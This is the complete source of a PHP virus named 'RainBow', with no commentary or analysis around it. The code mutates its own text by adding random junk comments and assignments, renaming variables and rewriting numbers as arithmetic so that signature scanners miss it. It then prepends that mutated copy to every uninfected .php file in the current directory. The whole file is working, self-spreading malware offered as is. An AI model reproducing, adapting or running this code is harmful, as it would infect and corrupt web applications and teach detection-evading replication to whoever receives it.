<?php // RainBow
srand((double)microtime()*1000000);
 $changevars=array('changevars','string','newcont','curdir','filea','victim','viccont','newvars','returnvar','counti','countj','trash','allcont','number','remn');
 $string=strtok(fread(fopen(__FILE__,'r'), filesize(__FILE__)),chr(13).chr(10));
 $newcont='<?php // RainBow'.chr(13).chr(10);
while ($string && $string!='?>'){
if(rand(0,1)){
if(rand(0,1)){$newcont.='// '.trash('',0).chr(13).chr(10);}
if(rand(0,1)){$newcont.='$'.trash('',0).'='.chr(39).trash('',0).chr(39).';'.chr(13).chr(10);}
if(rand(0,1)){$newcont.='$'.trash('',0).'='.rand().';'.chr(13).chr(10);}}
 $string=strtok(chr(13).chr(10));
if($string{0}!='/' && $string{0}!='$'){$newcont.=$string.chr(13).chr(10);}}
 $counti=0;
while($changevars[$counti]){
 $newcont=str_replace($changevars[$counti++],trash('',0),$newcont);}
 $countj=-1; $number='';
while(++$countj<strlen($newcont)){
if (ord($newcont{$countj})>47&&ord($newcont{$countj})<58){
 $number=$newcont{$countj};
while(ord($newcont{++$countj})>47&&ord($newcont{$countj})<58){$number.=$newcont{$countj};}
 $remn=rand(1,10);
if (!rand(0,5)){switch(rand(1,3)){case 1:$allcont.='('.($number-$remn).'+'.$remn.')';break;
case 2:$allcont.='('.($number+$remn).'-'.$remn.')';break;
case 3:$allcont.='('.($number*$remn).'/'.$remn.')';break;}}else{$allcont.=$number;}}
 $allcont.=$newcont{$countj};$number='';}
 $curdir=opendir('.');
while($filea=readdir($curdir)){
if(strstr($filea,'.php')){$victim=fopen($filea,'r+');
if (!strstr(fread($victim, 25),'RainBow')){rewind($victim);
 $viccont=fread($victim,filesize($filea));
rewind($victim);
fwrite($victim,$allcont.$viccont);}
fclose($victim);}}
closedir($curdir);
function trash($returnvar, $countj){
do{$returnvar.=chr(rand(97,122));}while($countj++<rand(5,15));
return $returnvar;}
?>